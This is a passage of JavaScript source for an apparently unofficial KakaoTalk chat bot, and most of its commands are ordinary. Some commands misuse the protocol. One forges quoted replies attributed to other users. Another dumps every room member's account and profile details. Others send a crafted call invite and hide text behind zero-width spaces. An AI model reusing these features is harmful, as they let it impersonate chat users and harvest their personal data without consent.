                                    .text("작업 과정에서 오류가 발생했습니다.\b" + e)
                                    .build($KnownChatType.REPLY)
                            );
                        };
                    } else {
                        channel.sendChat("정보를 가져올 사람을 멘션해주세요!");
                    };
                };

                if (data.text.startsWith(prefix + "프로필")) {
                    if (data.originalType == $KnownChatType.REPLY) {
                        var a = new $ReplyContent(data);
                        getProfile(channel, a.chat._chat.sender.userId);
                    } else {
                        try {
                            if (data.text.includes(prefix + "프로필 ")) {
                                if (data.mentions[0]) {
                                    try {
                                        var v = data.mentions[0].user_id;
                                        getProfile(channel, v);
                                    } catch (error) {
                                        channel.sendChat(
                                            new $ChatBuilder()
                                                .append(new $ReplyContent(data.chat))
                                                .text("작업 과정에서 오류가 발생했습니다.\n" + error)
                                                .build($KnownChatType.REPLY)
                                        );
                                    };
                                } else {
                                    var v = data.text.replace(prefix + "프로필 ", "");
                                    v *= 1;
                                    getProfile(channel, v);
                                };
                            } else {
                                channel.sendChat("프로필을 가져올 대상을 멘션하거나 아이디를 적어주세요!!");
                            };
                        } catch (error) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("작업 과정에서 오류가 발생했습니다.\n" + error)
                                    .build($KnownChatType.REPLY)
                            );
                        };
                    };
                };

                if (data.text.startsWith(prefix + "강제읽기")) {
                    if (data.text.startsWith(prefix + "강제읽기 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                sendLinkEmbed(channel, "강제읽기", "https://previews.123rf.com/images/pichart99thai/pichart99thai1406/pichart99thai140600084/29892513-%ED%83%80%EC%9D%B4-%ED%95%98%EB%8A%98-%EB%82%98%EB%9D%BC.jpg");
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat("강제읽기 링크를 입력해주세요!");
                    };
                };

                if (data.text == prefix + "희선이") {
                    if (adminList.includes(id + '')) {
                        try {
                            var _mmm = data.text.split(' ')[2];
                            sendLinkEmbed(channel, "니애비위치", "https://previews.123rf.com/images/pichart99thai/pichart99thai1406/pichart99thai140600084/29892513-%ED%83%80%EC%9D%B4-%ED%95%98%EB%8A%98-%EB%82%98%EB%9D%BC.jpg");
                        } catch (error) {
                            outError = error + "$%^%$";
                            outError = outError.replace("$%^%$", "");
                            channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "롱텍")) {
                    if (data.text.startsWith(prefix + "롱텍 ")) {
                        if (adminList.includes(id + '')) {
                            try {
                                var _mmm = data.text.replace(prefix + "롱텍 ", "");
                                _mmm = _mmm.split('%%');
                                sendLong(channel, _mmm[0], _mmm[1]);
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat("롱텍 내용을 입력해주세요!\n" + prefix + "롱텍 <겉메>%<속메>");
                    };
                };

                if (data.text.startsWith(prefix + "검색 ")) {
                    let _mess = data.text;
                    _mess = _mess.replace(prefix + "검색 ", "");
                    channel.sendChat("https://www.google.com/search?q=" + encodeURI(_mess));
                };

                if (data.text.startsWith(prefix + "다음검색 ")) {
                    let _mess = data.text;
                    _mess = _mess.replace(prefix + "다음검색 ", "");
                    channel.sendChat("https://search.daum.net/search?q=" + encodeURI(_mess));
                };

                if (data.text.startsWith(prefix + "네이버검색 ")) {
                    let _mess = data.text;
                    _mess = _mess.replace(prefix + "네이버검색 ", "");
                    channel.sendChat("https://search.naver.com/search.naver?query=" + encodeURI(_mess));
                };

                if (data.text.startsWith(prefix + "유튜브검색 ")) {
                    let _mess = data.text;
                    _mess = _mess.replace(prefix + "유튜브검색 ", "");
                    channel.sendChat("https://www.youtube.com/results?search_query=" + encodeURI(_mess));
                };

                if (data.text.startsWith(prefix + "자가진단 ")) {
                    try {
                        var coder = data.text.split('자가진단 ')[1].split(" ")[0];
                        var grades = data.text.split('자가진단 ')[1].split(" ")[1];
                        var classs = data.text.split('자가진단 ')[1].split(" ")[2]
                        request(
                            { uri: "http://193.123.246.37/api/isSurvey?org=" + coder + "&grade=" + grades + "&class=" + classs },
                            (e, r, bo) => {
                                var bodys = bo.replace(/(\|[ ㅤ]*[0-9]{1,2}번[^\|(?! \|)]*[\|(?! \|)])/g, "\n$1");
                                channel.sendChat("**자가진단 현황**\n\n" + bodys);
                            }
                        )
                    } catch {
                        channel.sendChat("입력을 잘못 하셨거나 서버의 오류로 확인이 불가능합니다.");
                    };
                };

                if (data.text.startsWith(prefix + "따라해")) {
                    if (data.text == prefix + "따라해") {
                        channel.sendChat("봇이 따라할 글을 적어주세요!");
                    } else {
                        channel.sendChat(data.text.replace(prefix + "따라해 ", "") + "\n[ by " + data._chat.sender.userId + " ]");
                    };
                };

                if (data.text == prefix + "리토큰") {
                    if (adminList.includes(id + '')) {
                        async function a() {
                            var OAuthClient = await $OAuthApiClient.create();
                            var newTokenRes = await OAuthClient.renew({
                                userId: gggg_ID,
                                deviceUUID: ACC_UUID,
                                accessToken: gggg_TOKEN,
                                refreshToken: gggg_R_TOKEN
                            });
                            if (!newTokenRes.success) {
                                console.log("Token Refresh Failed -> " + newTokenRes.status);
                                channel.sendChat("토큰 리프레쉬 실패!\n" + newTokenRes.status);
                            } else {
                                var res = newTokenRes.result;
                                console.log('OAuth renew success');
                                console.log(`ExpiresIn: ${res.expiresIn}, type: ${res.type}, accessToken: ${res.credential.accessToken}`);
                                channel.sendChat("토큰 리프레쉬 성공!");
                            };
                        };
                        a();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                /*if (data.text == ".샌즈") {
                    async function a() {
                        // var r = await $AttachmentApi.upload(3, "long", "햐무");
                        // console.log(r.result);
                        // var a = await channel.sendChat(
                        //     new $ChatBuilder()
                        //         .text("姻")
                        //         // .append(new $AttachmentContent({
                        //         //     os: [{ t: 1, ct: "", jct: "" },
                        //         //     {
                        //         //         t: 4,
                        //         //         ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
                        //         //     }]
                        //         // }))
                        //         .append(new $AttachmentContent(r.result))
                        //         .build(1)
                        // );
                        // console.log(a);

                        // var a = await $ServiceApiClient.create(gggg_TOKEN);
                        // //requestFriendList(['normal']);
                        // console.log(a);
                        // var b = await a.requestFriendList(['normal']);
                        // console.log(b);

                        // var a = await $OAuthApiClient.create();
                        // console.log(a.config.locoPEMPublicKey.split('\n')[1]);
                        // var c = await $ServiceApiClient.create(a);
                        // console.log(c);
                        // var b = await c.requestFriendList(['normal']);
                        // console.log(b);

                        // let OAuthClient = await $OAuthApiClient.create();
                        // let newTokenRes = await OAuthClient.renew({
                        //     userId: gggg_ID,
                        //     deviceUUID: ACC_UUID,
                        //     accessToken: gggg_TOKEN,
                        //     refreshToken: gggg_R_TOKEN
                        // });
                        // if (!newTokenRes.success) {
                        //     console.log(newTokenRes.status);
                        // } else {
                        //     var res = newTokenRes.result;
                        //     console.log('OAuth renew success');
                        //     console.log(`ExpiresIn: ${res.expiresIn}, type: ${res.type}, accessToken: ${res.credential.accessToken}`);
                        //     var webCL = await node_kakao.createSessionWebClient(gggg_L_RES.result, defConfig, 'https', 'exampleapi.com');
                        //     var c = new $ServiceApiClient(CLIENT);
                        //     c.config = defConfig;
                        //     console.log(c);
                        //     var b = await c.requestFriendList();
                        //     console.log(b);
                        // };

                        // var mentionMsg = new $ChatBuilder().text('kakashi').append(new $MentionContent({ userId: 376163152 , nickname: 'm' }));
                        // var a = data.chat;
                        // a.attachment = mentionMsg;
                        // a.type = 1;
                        // a.logId = 1;
                        // a.prevLogId = 1;
                        // a.messageId = 1;
                        // a.text = null;
                        // a.sender = { userId: new Long("12345678") };
                        // // console.log(a);

                        // channel.sendChat(
                        //     new $ChatBuilder()
                        //         .append(new $ReplyContent(a))
                        //         .text("ㅋㅋㄹ")
                        //         .build($KnownChatType.REPLY)
                        // );

                        // var user = await channel.getUserInfo({ userId: id });
                        // var profile = user.originalProfileURL;
                        // var status = user.statusMessage;

                        // channel.sendChat(
                        //     new $ChatBuilder().text(" ").append(new $AttachmentContent({
                        //         "L": "https://nefew.kr/",
                        //         "Q": "지훈은 최강이다",
                        //         "V": "music",
                        //         "F": {},
                        //         "R": [
                        //             {
                        //                 "L": "https://nefew.kr/",
                        //                 "T": channel.getUserInfo({ userId: id }).nickname,
                        //                 "I": profile,
                        //                 "W": 401,
                        //                 "H": 401,
                        //                 "DE": "\u200b".repeat(1000) + status + "\u200b".repeat(1000)
                        //             };
                        //         ]
                        //     })).build(23)
                        // );

                        // var userList = Array.from(channel.getAllUserInfo());
                        // console.log(userList);
                        // var userIdList = [];
                        // for (var i = 0; i < userList.length; i++) {
                        //     userIdList.push(userList[i].userId);
                        // };
                        // for (var i = 0; i < userIdList.length; i++) {

                        // };
                    };
                    a();
                };*/

                if (data.text == prefix + "내정보") {
                    (async () => {
                        var user = await channel.getUserInfo({ userId: id });
                        var profile = user.originalProfileURL;
                        var status = user.statusMessage;
                        channel.sendChat(
                            new $ChatBuilder().text(" ").append(new $AttachmentContent({
                                "L": "https://nefew.kr/",
                                "Q": channel.getUserInfo({ userId: id }).nickname,
                                "V": "music",
                                "F": {},
                                "R": [
                                    {
                                        "L": "https://nefew.kr/",
                                        "T": channel.getUserInfo({ userId: id }).nickname,
                                        "I": profile,
                                        "W": 401,
                                        "H": 401,
                                        "DE": "\u200b".repeat(1000) + status + "\u200b".repeat(1000)
                                    }
                                ]
                            })).build(23)
                        );
                    })();
                };

                if (data.text == prefix + "방생성") {
                    if (adminList.includes(id + '')) {
                        try {
                            CLIENT.ChannelManager.createOpenChannel({
                                linkName: "asdf",
                                description: "room : asdf",
                                canSearchLink: true,
                                maxUserLimit: 100,
                                clientProfile: { type: 1 },
                            }).then((x) => {
                                if (x.result) {
                                    var LnkId = x.result.openLink.linkStruct.linkId;
                                    channel.sendChat(
                                        "옾챗 방을 만들었습니다.\n링크id: " +
                                        x.result.openLink.linkStruct.linkId +
                                        "\n링크: " +
                                        x.result.openLink.linkStruct.linkURL
                                    );
                                };
                            });
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "화면임티") {
                    if (adminList.includes(id + '')) {
                        channel.sendChat(
                            new $ChatBuilder().text("공백 부분 눌러봐 ㄹㅇㅋㅋ").append(new $AttachmentContent({
                                "name": "(이모티콘)",
                                "url": "4415897.emot_001.png",
                                "type": "animated-emoticon/digital-item",
                                "path2": "2212560.emot_033.png",
                                "scon": "6002007.file_008.scon",
                                "s": 0
                            })).build(22)
                        );
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "보이스톡") {
                    if (adminList.includes(id + '')) {
                        try {
                            async function aa() {
                                var myMsg = channel.sendChat(
                                    new $ChatBuilder().text("{ \"type\":\"cinvite\",\"csIP\":\"210.103.249.154\",\"csIP6\":\"2404:4600:7:1e:210:103:249:154\",\"csPort\":9000,\"callId\":\"99906024551436399\",\"duration\":0 }").append(new $AttachmentContent({
                                        "type": "cinvite",
                                        "csIP": "210.103.249.154",
                                        "csIP6": "2404:4600:7:1e:210:103:249:154",
                                        "csPort": 9000,
                                        "callId": "99906024551436399",
                                        "duration": 0
                                    })).build(51)
                                );
                            };
                            aa();
                        } catch (e) {
                            channel.sendChat(e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "임티 ")) {
                    var c = data.text.split(' ')[1];
                    c *= 1;
                    if (0 >= c) {
                        channel.sendChat("0 이하의 숫자는 이모티콘 전송이 불가능합니다!");
                    } else if (9 >= c) {
                        channel.sendChat(
                            new $ChatBuilder().append(new $AttachmentContent({
                                "type": "animated-sticker/digital-item",
                                "path": '4412207.emot_00' + c + '.webp',
                                "name": "(이모티콘)",
                                "sound": "",
                                "width": "360",
                                "height": "360",
                                "msg": "",
                                "alt": "카카오 이모티콘"
                            })).build(20)
                        );
                    } else if (48 >= c) {
                        channel.sendChat(
                            new $ChatBuilder().append(new $AttachmentContent({
                                "type": "animated-sticker/digital-item",
                                "path": '4412207.emot_0' + c + '.webp',
                                "name": "(이모티콘)",
                                "sound": "",
                                "width": "360",
                                "height": "360",
                                "msg": "",
                                "alt": "카카오 이모티콘"
                            })).build(20)
                        );
                    } else if (c >= 49) {
                        channel.sendChat("이모티콘 번호는 48까지만 있습니다!");
                    } else {
                        channel.sendChat("이모티콘 번호는 숫자로 입력해주세요!");
                    };
                };

                if (data.text.startsWith(prefix + "임티2 ")) {
                    if (adminList.includes(id + '')) {
                        var c = data.text.split(' ')[1];
                        var s = data.text.split(' ')[2];
                        c *= 1;
                        s *= 1;
                        if (!(s > 0) && !(s < 0) && !(s = 0)) {
                            channel.sendChat("이모티콘 크기는 숫자로 적어주세요!");
                        } else if (0 >= c) {
                            channel.sendChat("0 이하의 숫자는 이모티콘 전송이 불가능합니다!");
                        } else if (9 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": "image/webp",
                                    "path": '4412207.emot_00' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": s,
                                    "height": s,
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(25)
                            );
                        } else if (48 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": "image/webp",
                                    "path": '4412207.emot_0' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": s,
                                    "height": s,
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(25)
                            );
                        } else if (c >= 49) {
                            channel.sendChat("이모티콘 번호는 48까지만 있습니다!");
                        } else {
                            channel.sendChat("이모티콘 번호는 숫자로 입력해주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "임티3 ")) {
                    if (adminList.includes(id + '')) {
                        var c = data.text.split(' ')[2];
                        var n = data.text.split(' ')[1];
                        var m1;
                        var m2;
                        if (data.text.split(' ')[3] + "" == "1") {
                            m1 = "";
                            m2 = 12;
                        } else if (data.text.split(' ')[3] + "" == "2") {
                            m1 = "animated-";
                            m2 = 20;
                        } else {
                            channel.sendChat("이모티콘 옵션을 올바르게 입력해주세요!");
                            return;
                        };
                        c *= 1;
                        if (0 >= c) {
                            channel.sendChat("0 이하의 숫자는 이모티콘 전송이 불가능합니다!");
                        } else if (9 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": m1 + "sticker/digital-item",
                                    "path": n + '.emot_00' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": "360",
                                    "height": "360",
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else if (99 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": m1 + "sticker/digital-item",
                                    "path": n + '.emot_0' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": "360",
                                    "height": "360",
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else if (c >= 100) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": m1 + "sticker/digital-item",
                                    "path": n + '.emot_' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": "360",
                                    "height": "360",
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else {
                            channel.sendChat("이모티콘 번호를 올바르게 입력해주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "임티4 ")) {
                    if (adminList.includes(id + '')) {
                        var c = data.text.split(' ')[2];
                        var n = data.text.split(' ')[1];
                        var s = data.text.split(' ')[3];
                        var m1;
                        var m2;
                        if (data.text.split(' ')[4] + "" == "1") {
                            m1 = "";
                            m2 = 12;
                        } else if (data.text.split(' ')[4] + "" == "2") {
                            m1 = "animated-";
                            m2 = 25;
                        } else {
                            channel.sendChat("이모티콘 옵션을 올바르게 입력해주세요!\n입력된 옵션값: " + data.text.split(' ')[4]);
                            return;
                        };
                        c *= 1;
                        s *= 1;
                        if (!(s > 0) && !(s < 0) && !(s = 0)) {
                            channel.sendChat("이모티콘 크기는 숫자로 적어주세요!");
                        } else if (0 >= c) {
                            channel.sendChat("0 이하의 숫자는 이모티콘 전송이 불가능합니다!");
                        } else if (9 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": "image/webp",
                                    "path": n + '.emot_00' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": s,
                                    "height": s,
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else if (99 >= c) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": "image/webp",
                                    "path": n + '.emot_0' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": s,
                                    "height": s,
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else if (c >= 100) {
                            channel.sendChat(
                                new $ChatBuilder().append(new $AttachmentContent({
                                    "type": m1 + "sticker/digital-item",
                                    "path": n + '.emot_' + c + '.webp',
                                    "name": "(이모티콘)",
                                    "sound": "",
                                    "width": s,
                                    "height": s,
                                    "msg": "",
                                    "alt": "카카오 이모티콘"
                                })).build(m2)
                            );
                        } else {
                            channel.sendChat("이모티콘 번호를 올바르게 입력해주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "임티5 ")) {
                    var c = data.text.split(' ')[1];
                    var a = c.split(':')[0];
                    a *= 1;
                    var b = c.split(':')[1];
                    b *= 1;
                    if (0 >= c) {
                        channel.sendChat("0 이하의 숫자는 이모티콘 전송이 불가능합니다!");
                    } else if (5 >= a) {
                        if (b >= 10) {
                            channel.sendChat(
                                new $ChatBuilder().text("공백 부분 눌러봐 ㄹㅇㅋㅋ").append(new $AttachmentContent({
                                    "name": "(이모티콘)",
                                    "url": "4415897.emot_001.png",
                                    "type": "animated-emoticon/digital-item",
                                    "path2": "2212560.emot_033.png",
                                    "scon": `600200${a + 4}.file_0${b}.scon`,
                                    "s": 0
                                })).build(22)
                            );
                        } else {
                            channel.sendChat(
                                new $ChatBuilder().text("공백 부분 눌러봐 ㄹㅇㅋㅋ").append(new $AttachmentContent({
                                    "name": "(이모티콘)",
                                    "url": "4415897.emot_001.png",
                                    "type": "animated-emoticon/digital-item",
                                    "path2": "2212560.emot_033.png",
                                    "scon": `600200${a + 4}.file_00${b}.scon`,
                                    "s": 0
                                })).build(22)
                            );
                        };
                    } else if (a >= 6) {
                        channel.sendChat("이모티콘 번호는 5까지만 있습니다!");
                    } else {
                        channel.sendChat("이모티콘 번호는 숫자로 입력해주세요!");
                    };
                };

                if (data.text == prefix + "자동등록") {
                    if (id == 305751063 || id == 83746916922909719 || id == 48159837962986520) {
                        if (adminList.includes(id + '')) {
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("이미 관리자에 등록이 되어있습니다.")
                                    .build($KnownChatType.REPLY));
                        } else {
                            adminList.push(id);
                            var saveId = "\n" + id + "";
                            fs.readFile('./bot/adminlist.txt', 'utf8', function (err, data) {
                                fs.writeFile('./bot/adminlist.txt', data + saveId, 'utf8', function (error) { console.log('write end') });
                            });
                            console.log("ADMIN VERIFICATION: " + (id));
                            channel.sendChat(
                                new $ChatBuilder()
                                    .append(new $ReplyContent(data.chat))
                                    .text("관리자 인증에 성공했습니다!\n≫KAKAOTALK LOCO CLIENT V" + ver + "\n≫Edit by NEFEW")
                                    .build($KnownChatType.REPLY));
                        };
                    };
                };

                if (data.text.startsWith(prefix + "위임")) {
                    if (data.text.startsWith(prefix + "위임 ")) {
                        if (adminList.includes(id + '')) {
                            if (adminList.includes(data.text.replace(prefix + "위임 ", ""))) {
                                channel.sendChat("이미 해당 유져는 관리자입니다.")
                            } else {
                                let _dododo = data.text.replace(prefix + "위임 ", "");
                                _dododo *= 1;
                                adminList.push(_dododo);
                                var saveId = "\n" + _dododo + "";
                                fs.readFile('./bot/adminlist.txt', 'utf8', function (err, data) {
                                    fs.writeFile('./bot/adminlist.txt', data + saveId, 'utf8', function (error) { console.log('write end') });
                                });
                                channel.sendChat("사용자 [" + _dododo + "] 님을 관리자로 위임하였습니다.");
                            };
                        } else {
                            channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                        };
                    } else {
                        channel.sendChat(prefix + "위임 <아이디> 형식으로 써주세요!");
                    };
                };

                if (data.text == prefix + "괄자") {
                    if (adminList.includes(id + '')) {
                        try {
                            var msg = "관리자 목록:";
                            var count;
                            for (getValueFor = 0; getValueFor < adminList.length; getValueFor++) {
                                count = getValueFor;
                                msg += "\n[" + (count + 1) + "/" + adminList.length + "]" + adminList[getValueFor] + "  [TYPE:" + typeof (adminList[getValueFor]) + "]";
                            };
                            channel.sendChat(msg);
                        } catch (e) {
                            channel.sendChat("" + e);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "칭호 ")) {
                    if (adminList.includes(id + '')) {
                        var prpr = data.text;
                        prefix = prpr.replace(prefix + "칭호 ", "");
                        channel.sendChat("모든 명령어들의 칭호를 " + prefix + "로 바꿨습니다!");
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "읽은사람") {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            try {
                                const reply = data.attachment($ReplyAttachment);
                                const logId = reply.src_logId;
                                if (logId) {
                                    const readers = channel.getReaders({ logId });
                                    channel.sendChat("읽은사람" + "\u200b".repeat(1000) + `\n\n\n채널ID: ${roomId}\n\n메세지 로그ID: ${logId}\n\n읽은사람 수: ${readers.length}\n\n읽은사람 닉네임:\n${readers.map(reader => reader.nickname).join(', ')}`);
                                };
                            } catch {
                                channel.sendChat("작업 과정에서 오류가 발생했습니다.");
                            };
                        } else {
                            channel.sendChat("메세지를 답장 형태로 적어주세요.");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "종료" || data.text == prefix + "중지") {
                    if (adminList.includes(id + '')) {
                        async function a() {
                            await channel.sendChat("프로세스가 중지됩니다...\n≫KAKAOTALK LOCO V" + ver + "\n≫Edit by NEFEW");
                            await CLIENT.close();
                            process.exit();
                        };
                        a();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "입장")) {
                    if (adminList.includes(id + '')) {
                        async function a() {
                            var openLink = data.text.replace(prefix + "입장 ", "");
                            var oData = await CLIENT.channelList.open.getJoinInfo(openLink);
                            if (!oData.success) {
                                channel.sendChat("채팅방의 정보를 불러올수 없습니다!\n" + openLink);
                            } else if (oData.result.openLink.type !== $OpenLinkType.CHANNEL) {
                                channel.sendChat("해당 채팅방은 그룹 오픈채팅방이 아닙니다!\n" + openLink);
                            } else {
                                var a = await CLIENT.channelList.open.joinChannel({ linkId: oData.result.openLink.linkId }, { nickname: "디스코드 네퓨봇" });
                                if (!a.success) {
                                    channel.sendChat("채팅방에 입장하던 중 오류가 발생했습니다!\n" + openLink + "\n" + a.status);
                                } else {
                                    channel.sendChat("채팅방에 입장하였습니다!\n" + openLink);
                                };
                            };
                        };
                        a();
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                /*if (data.text == "!test") {
                    /**
                     * 
                     * .append(new $AttachmentContent({
                            "type": "animated-sticker/digital-item",
                            "path": '4412207.emot_00' + c + '.webp',
                            "name": "(이모티콘)",
                            "sound": "",
                            "width": "360",
                            "height": "360",
                            "msg": "",
                            "alt": "카카오 이모티콘"
                        }))
                     
                    channel.sendChat(
                        new $ChatBuilder()
                            .text("Search")
                            .append(new $AttachmentContent({
                                L: "https://open.kakao.com/o/swf07uSd",
                                Q: "개발자 카카오톡",
                                V: "image",
                                R: [
                                    {
                                        D: "개발자 카카오톡",
                                        L: "https://open.kakao.com/o/swf07uSd",
                                        I: "https://static-s.aa-cdn.net/img/gp/20600004812579/3pxme9H2EsroBsuGTyJVREQZzwIjHP4fFRne2VRB3WDxSZVbBVXjT-zV_MDv8OEVBsQ=w300?v=1",
                                        W: 600,
                                        H: 600,
                                    },
                                ]
                            }))
                            .build(23)
                    );
                };*/

                if (data.text.startsWith(prefix + "답장 ")) {
                    if (adminList.includes(id + '')) {
                        if (data.originalType == $KnownChatType.REPLY) {
                            try {
                                var m1 = data.text.replace(prefix + "답장 ", "").split('%')[0];
                                var m2 = data.text.replace(prefix + "답장 ", "").split('%')[1];
                                customChat = data.chat;
                                customChat.sender.userId = data.attachment($ReplyAttachment).src_userId;
                                customChat.text = m1;
                                channel.sendChat(
                                    new $ChatBuilder()
                                        .append(new $ReplyContent(customChat))
                                        .text(m2 + "")
                                        .build($KnownChatType.REPLY)
                                );
                            } catch (error) {
                                outError = error + "$%^%$";
                                outError = outError.replace("$%^%$", "");
                                channel.sendChat("작업 수행 도중에 오류가 발생했습니다. 오류를 출력하시려면 '" + prefix + "오류' 명령어를 써주세요.");
                            };
                        } else {
                            channel.sendChat("해당 명령어는 답장 형태로 적어주세요!");
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "키워드")) {
                    if (adminList.includes(id + '')) {
                        if (data.text == prefix + "키워드") {
                            channel.sendChat(keyWordDescrip);
                        } else {
                            //"\n|  " + prefix + "키워드 <키워드> <명령어이름> <옵션>"
                            splitValue = data.text.split(' ');
                            if (splitValue[2] == "해시태그") {
                                keyWordFunction = "해시태그";
                                keyWord = splitValue[1];
                                keyWordData = splitValue[3] + " " + splitValue[4];
                                keyWordDescrip = "KeyWord Setting is successfully finished!\n\nKeyWord Description\nFunction: " + keyWordFunction + "\nKeyWord: " + keyWord + "\nData: " + keyWordData;
                                channel.sendChat("KeyWord Setting is successfully finished!\n\n" + keyWordDescrip);
                            };
                        };
                    };
                };

                if (data.text == prefix + "키워드삭제") {
                    if (adminList.includes(id + '')) {
                        keyWordFunction = "我支持中国共产党。但是毛泽东是残疾的。";
                        keyWord = "我支持中国共产党。但是毛泽东是残疾的。";
                        keyWordData = "我支持中国共产党。但是毛泽东是残疾的。";
                        keyWordDescrip = "설정된 키워드 없음";
                        channel.sendChat("Successfully removed KeyWord!");
                    };
                };

                if (data.text == prefix + "방정보") {
                    if (adminList.includes(id + '')) {
                        try {
                            var userList = Array.from(channel.getAllUserInfo());
                            var msg = "<<<<<<<<<<<<방정보>>>>>>>>>>>>" +
                                "\n\n방 제목: " + channel.getName() +
                                "\n\n방 아이디: " + roomId +
                                "\n\n방 인원: " + channel.userCount +
                                "\n\n----------------------------" +
                                "";

                            for (var i = 0; i < userList.length; i++) {
                                try {
                                    var getId = userList[i].userId;
                                    var user = channel.getUserInfo({ userId: getId });
                                    var accId = user.accountId;
                                    var username = user.nickname;
                                    var status = user.statusMessage;
                                    var country = user.countryIso;
                                    var profile = user.originalProfileURL;
                                    var service = user.linkedServices
                                    msg += "\n" +
                                        "\n프로필 아이디: " + getId +
                                        "\n계정 아이디: " + accId +
                                        "\n닉네임: " + username +
                                        "\n상태메세지: " + status +
                                        "\n국가: " + country +
                                        "\n프로필사진: " + profile +
                                        "";
                                } catch {

                                };
                            };

                            msg += "\n\n----------------------------";

                            sendLong(channel, "[방정보]\n" + roomId, msg);
                        } catch (error) {
                            channel.sendChat(error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text.startsWith(prefix + "채팅청소")) {
                    if (adminList.includes(id + '')) {
                        try {
                            if (data.text == prefix + "채팅청소") {
                                cleanChat(channel, 15, "---채팅청소 종료지점---");
                            } else {
                                var repeatCount = data.text.replace(prefix + "채팅청소 ", "");
                                repeatCount *= 1;
                                cleanChat(channel, repeatCount, "---채팅청소 종료지점---");
                            };
                        } catch (error) {
                            channel.sendChat("오류 발생!\n" + error);
                        };
                    } else {
                        channel.sendChat("당신은 해당 명령어를 사용할 권한이 없습니다!");
                    };
                };

                if (data.text == prefix + "전체감지") {
                    if (adminList.includes(id + '')) {
                        try {
                            var userList = Array.from(channel.getAllUserInfo());
                            var userIdList = [];
                            for (var i = 0; i < userList.length; i++) {
                                userIdList.push(userList[i].userId);
                            };
